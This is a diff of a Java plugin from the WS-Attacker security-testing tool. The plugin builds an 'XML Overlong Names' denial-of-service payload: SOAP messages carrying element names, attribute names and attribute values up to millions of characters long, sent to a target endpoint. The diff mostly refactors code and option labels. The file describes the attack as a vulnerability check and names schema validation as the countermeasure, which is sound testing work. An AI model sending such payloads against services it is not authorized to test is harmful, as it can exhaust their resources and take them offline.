@@ -18,61 +18,14 @@
  */
 package wsattacker.plugin.dos;
 
-import org.apache.xmlbeans.XmlException;
-import org.w3c.dom.Document;
-import org.w3c.dom.Node;
-import org.xml.sax.SAXException;
-
-import wsattacker.main.composition.plugin.AbstractPlugin;
-import wsattacker.main.composition.plugin.option.AbstractOption;
-import wsattacker.main.composition.plugin.option.AbstractOptionBoolean;
-import wsattacker.main.composition.plugin.option.AbstractOptionChoice;
 import wsattacker.main.composition.plugin.option.AbstractOptionInteger;
-import wsattacker.main.composition.plugin.option.AbstractOptionVarchar;
-import wsattacker.main.composition.testsuite.RequestResponsePair;
-import wsattacker.main.plugin.PluginState;
 import wsattacker.main.plugin.option.OptionLimitedInteger;
 import wsattacker.main.plugin.option.OptionSimpleBoolean;
-import wsattacker.main.plugin.option.OptionSimpleVarchar;
-import wsattacker.main.testsuite.TestSuite;
-import wsattacker.util.SoapUtilities;
-import wsattacker.util.SortedUniqueList;
-
-import com.eviware.soapui.impl.wsdl.WsdlInterface;
-import com.eviware.soapui.impl.wsdl.WsdlOperation;
-import com.eviware.soapui.impl.wsdl.WsdlRequest;
-import com.eviware.soapui.impl.wsdl.WsdlSubmit;
-import com.eviware.soapui.impl.wsdl.WsdlSubmitContext;
-import com.eviware.soapui.impl.wsdl.support.soap.SoapUtils;
-import com.eviware.soapui.model.iface.Operation;
-import com.eviware.soapui.model.iface.Request.SubmitException;
-import com.eviware.soapui.model.iface.Response;
-import com.eviware.soapui.support.types.StringToStringMap;
 import wsattacker.plugin.dos.dosExtension.abstractPlugin.AbstractDosPlugin;
 
-import wsattacker.plugin.dos.dosExtension.mvc.AttackMVC;
-
-import java.io.BufferedWriter;
-import java.io.FileWriter;
-import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Map;
-import java.util.Random;
-import java.util.logging.Level;
-import java.util.logging.Logger;
-import javax.xml.xpath.XPath;
-import javax.xml.xpath.XPathConstants;
-import javax.xml.xpath.XPathExpressionException;
-import javax.xml.xpath.XPathFactory;
-import org.w3c.dom.Element;
-import wsattacker.main.composition.plugin.PluginFunctionInterface;
-import wsattacker.main.plugin.option.OptionSimpleText;
-import wsattacker.plugin.dos.dosExtension.attackClasses.hashDos.CollisionDJBX31A;
-import wsattacker.plugin.dos.dosExtension.attackClasses.hashDos.CollisionDJBX33A;
-import wsattacker.plugin.dos.dosExtension.function.postanalyze.DOSPostAnalyzeFunction;
-import wsattacker.plugin.dos.dosExtension.mvc.model.AttackModel;
 import wsattacker.plugin.dos.dosExtension.option.OptionTextAreaSoapMessage;
-import wsattacker.plugin.dos.dosExtension.util.UtilDos;
 
 public class XmlOverlongNames extends AbstractDosPlugin {
 
@@ -88,129 +41,103 @@ public class XmlOverlongNames extends AbstractDosPlugin {
     private OptionSimpleBoolean optionParam12;
     private AbstractOptionInteger optionParam13;
 
-
     @Override
     public void initializeDosPlugin() {
+        initData();
+        // Custom Initilisation
+        optionParam8 = new OptionSimpleBoolean("XML overlong element name", true, "checked = XML overlong element name attack enabled");
+        optionParam9 = new OptionLimitedInteger("XML overlong element name: Length", 100000, "Length of overlong element name", 1, 90000000);
+        optionParam10 = new OptionSimpleBoolean("XML overlong attribute name", true, "checked = XML overlong attribute name attack enabled");
+        optionParam11 = new OptionLimitedInteger("XML overlong attribute name: Length", 100000, "Length of overlong attribute name", 1, 90000000);
+        optionParam12 = new OptionSimpleBoolean("XML overlong attribute value", true, "checked = XML overlong attribute value attack enabled");
+        optionParam13 = new OptionLimitedInteger("XML overlong attribute value: Lenght", 100000, "Length of overlong attribute value", 1, 90000000);
 
-	// Custom Initilisation
-	optionParam8 = new OptionSimpleBoolean("Param 8.0", true, "checked = XML overlong element name attack enabled");
-	optionParam9 = new OptionLimitedInteger("Param 8.1", 100000, "Length of overlong element name", 1, 90000000);
-	optionParam10 = new OptionSimpleBoolean("Param 9.0", true, "checked = XML overlong attribute attack enabled");
-	optionParam11 = new OptionLimitedInteger("Param 9.1", 100000, "Length of overlong attribute name", 1, 90000000);
-	optionParam12 = new OptionSimpleBoolean("Param 10.0", true, "checked = XML overlong attribute value attack enabled");
-	optionParam13 = new OptionLimitedInteger("Param 10.1", 100000, "Length of overlong attribute value", 1, 90000000);
-
-	getPluginOptions().add(optionParam8);
-	getPluginOptions().add(optionParam9);
-	getPluginOptions().add(optionParam10);
-	getPluginOptions().add(optionParam11);
-	getPluginOptions().add(optionParam12);
-	getPluginOptions().add(optionParam13);
+        getPluginOptions().add(optionParam8);
+        getPluginOptions().add(optionParam9);
+        getPluginOptions().add(optionParam10);
+        getPluginOptions().add(optionParam11);
+        getPluginOptions().add(optionParam12);
+        getPluginOptions().add(optionParam13);
 
     }
 
-    @Override 
-    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition(){
-	return OptionTextAreaSoapMessage.PayloadPosition.HEADERLASTCHILDELEMENT;
-    }      
-    
     @Override
-    public String getName() {
-	return "XML Overlong Names Attack";
+    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition() {
+        return OptionTextAreaSoapMessage.PayloadPosition.HEADERLASTCHILDELEMENT;
     }
 
-    @Override
-    public String getDescription() {
-	return "This attack checks whether or not a Web service is vulnerable to the \"XML Overlong Names\" attack. "
-		+ "A vulnerable Web service will run out of resources when trying to parse an XML message with overlong names.\n"
-		+ "A detailed description of the attack can be found here: http://clawslab.nds.rub.de/wiki/index.php/XML_MegaTags"
-		+ "\n\n"
-		+ "The attack algorithm replaces the string $$PAYLOADELEMENT$$ in the SOAP message below \n"
-		+ "with the payload defined in parameter 8-10.\n"
-		+ "The placeholder $$PAYLOADELEMENT$$ can be set to any other position in the SOAP message"
-		+ "\n\n"
-		+ "The following parameters can be used to insert overlong names:\n"
-		+ "- Param 8.1: Only if enabled,length of an overlong element name in kb\n"
-		+ "- Param 9.1: Only if enabled, length of an overlong attribute name in kb\n"
-		+ "- Param 10.1: Only if enabled, length of overlong attribute content in kb\n"
-		+ "\n\n"
-		+ "The attack parameters 8, 9 and 10 are independent of each other. \n"
-		+ "Each subattack will be inserted in a seperate element.\n"
-		+ "A change in one parameter has no effect on the other."
-		+ "\n\n";
-    }
-
-    @Override
-    public String getCountermeasures() {
-	return "In order to counter the attack, strict XML schema validation should be performed to catch these oversized nodes and values.";
-    }
-
-    @Override
-    public String getAuthor() {
-	return "Andreas Falkenberg";
-    }
-
-    @Override
-    public String getVersion() {
-	return "1.0 / 2012-12-30";
+    public void initData() {
+        setName("XML Overlong Names Attack");
+        setDescription("This attack checks whether or not a Web service is vulnerable to the \"XML Overlong Names\" attack. "
+          + "A vulnerable Web service will run out of resources when trying to parse an XML message with overlong names.\n"
+          + "A detailed description of the attack can be found here: http://clawslab.nds.rub.de/wiki/index.php/XML_MegaTags"
+          + "\n\n"
+          + "The attack algorithm replaces the string $$PAYLOADELEMENT$$ in the SOAP message below \n"
+          + "with the payload defined in parameter 8-10.\n"
+          + "The placeholder $$PAYLOADELEMENT$$ can be set to any other position in the SOAP message"
+          + "\n\n"
+          + "The following parameters can be used to insert overlong names:\n"
+          + "- Param 8.1: Only if enabled,length of an overlong element name in kb\n"
+          + "- Param 9.1: Only if enabled, length of an overlong attribute name in kb\n"
+          + "- Param 10.1: Only if enabled, length of overlong attribute content in kb\n"
+          + "\n\n"
+          + "The attack parameters 8, 9 and 10 are independent of each other. \n"
+          + "Each subattack will be inserted in a seperate element.\n"
+          + "A change in one parameter has no effect on the other."
+          + "\n\n");
+        setCountermeasures("In order to counter the attack, strict XML schema validation should be performed to catch these oversized nodes and values.");
     }
 
     @Override
     public void createTamperedRequest() {
 
-	StringBuilder sb = new StringBuilder("");
-	
-	// elementname
-	if (optionParam8.isOn()) {
-	    sb.append("<");
-	    for (int i = 1; i < (optionParam9.getValue()); i++) {
-		sb.append("A");
-	    }
-	    sb.append(">test<\"");
-	    for (int i = 1; i < (optionParam9.getValue()); i++) {
-		sb.append("A");
-	    }	
-	    sb.append(">");	    
-	}
-	
-	// attributename
-	if (optionParam10.isOn()) {
-	    sb.append("<abc ");
-	    for (int i = 1; i < (optionParam11.getValue()); i++) {
-		sb.append("B");
-	    }
-	    sb.append("=\"test\">value</abc>");
-	}
-	
-	// attributecontent
-	if (optionParam12.isOn()) {
-	    sb.append("<def long=\"");
-	    for (int i = 1; i < (optionParam11.getValue()); i++) {
-		sb.append("C");
-	    }
-	    sb.append("\">value</def>");
-	}
+        StringBuilder sb = new StringBuilder("");
 
-	// replace "Payload-Attribute" with Payload-String 
-	String soapMessage = this.getOptionTextAreaSoapMessage().getValue();
-	String soapMessageFinal =  this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload(soapMessage, sb.toString());
+        // elementname
+        if (optionParam8.isOn()) {
+            sb.append("<");
+            for (int i = 1; i < (optionParam9.getValue()); i++) {
+                sb.append("A");
+            }
+            sb.append(">test<\"");
+            for (int i = 1; i < (optionParam9.getValue()); i++) {
+                sb.append("A");
+            }
+            sb.append(">");
+        }
 
-	// get HeaderFields from original request, if required add custom headers - make sure to clone!
-	Map<String, String> httpHeaderMap = new HashMap<String, String>();
-	for (Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet()) {
-	    httpHeaderMap.put(entry.getKey(), entry.getValue());
-	}	
-		      
-	// write payload and header to TamperedRequestObject
-	this.setTamperedRequestObject(httpHeaderMap, getOriginalRequest().getEndpoint(), soapMessageFinal);
+        // attributename
+        if (optionParam10.isOn()) {
+            sb.append("<abc ");
+            for (int i = 1; i < (optionParam11.getValue()); i++) {
+                sb.append("B");
+            }
+            sb.append("=\"test\">value</abc>");
+        }
+
+        // attributecontent
+        if (optionParam12.isOn()) {
+            sb.append("<def long=\"");
+            for (int i = 1; i < (optionParam11.getValue()); i++) {
+                sb.append("C");
+            }
+            sb.append("\">value</def>");
+        }
+
+        // replace "Payload-Attribute" with Payload-String
+        String soapMessage = this.getOptionTextAreaSoapMessage().getValue();
+        String soapMessageFinal = this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload(soapMessage, sb.toString());
+
+        // get HeaderFields from original request, if required add custom headers - make sure to clone!
+        Map<String, String> httpHeaderMap = new HashMap<String, String>();
+        for (Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet()) {
+            httpHeaderMap.put(entry.getKey(), entry.getValue());
+        }
+
+        // write payload and header to TamperedRequestObject
+        this.setTamperedRequestObject(httpHeaderMap, getOriginalRequest().getEndpoint(), soapMessageFinal);
     }
-
-    
-    
-    
     // ----------------------------------------------------------
-    // All custom DOS-Attack specific Methods below! 
+    // All custom DOS-Attack specific Methods below!
     // ----------------------------------------------------------
-    
-  
 }
